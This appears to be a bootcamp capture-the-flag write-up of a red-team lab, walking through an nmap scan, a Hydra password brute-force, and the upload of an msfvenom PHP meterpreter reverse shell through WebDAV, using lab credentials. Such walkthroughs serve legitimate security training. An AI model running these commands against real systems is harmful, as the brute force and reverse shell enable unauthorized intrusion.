# Red Team CTF

## Discover the IP address of the Linux server
- Run `nmap 192.168.1.0/24`

![nmap](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/20.%20Red%20vs%20Blue/1.%20Red/nmap.PNG)

- `Port 80` is open so we can access it from a web browser.

## Locate the hidden directory on the server.
- Navigate to the directory by typing: 192.168.1.105/company_folders/secret_folder

![first_password](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/20.%20Red%20vs%20Blue/1.%20Red/first%20password.PNG)

## Brute force the password for the hidden directory.
- With Ashton's name, we can run the Hydra attack against the directory using `hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder`

![hydra_syntax](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/20.%20Red%20vs%20Blue/1.%20Red/5_hydra_sytanx.png)

![hydra_result](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/20.%20Red%20vs%20Blue/1.%20Red/hydra%20result.PNG)

## Upload a PHP reverse shell payload.
- To set up the reverse shell, run: `msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 >> shell.php`

![metasploit](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/20.%20Red%20vs%20Blue/1.%20Red/metasploit.PNG)

- Place the reverse shell onto the WebdDAV directory.

![webdav](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/20.%20Red%20vs%20Blue/1.%20Red/webdav.PNG)

- Now that you're logged in, connect to the webdav folder by navigating to `192.168.1.105/webdav`. Use the credentials that you used before, user:ryan pass:linux4u.

![shell_in_web](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/20.%20Red%20vs%20Blue/1.%20Red/shell%20in%20web.PNG)

## Find and capture the flag.
- On the listener, search for the file flag.txt located in the root directory. Students can use many techniques they have learned in order to find it.

![flag](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/20.%20Red%20vs%20Blue/1.%20Red/flag.PNG)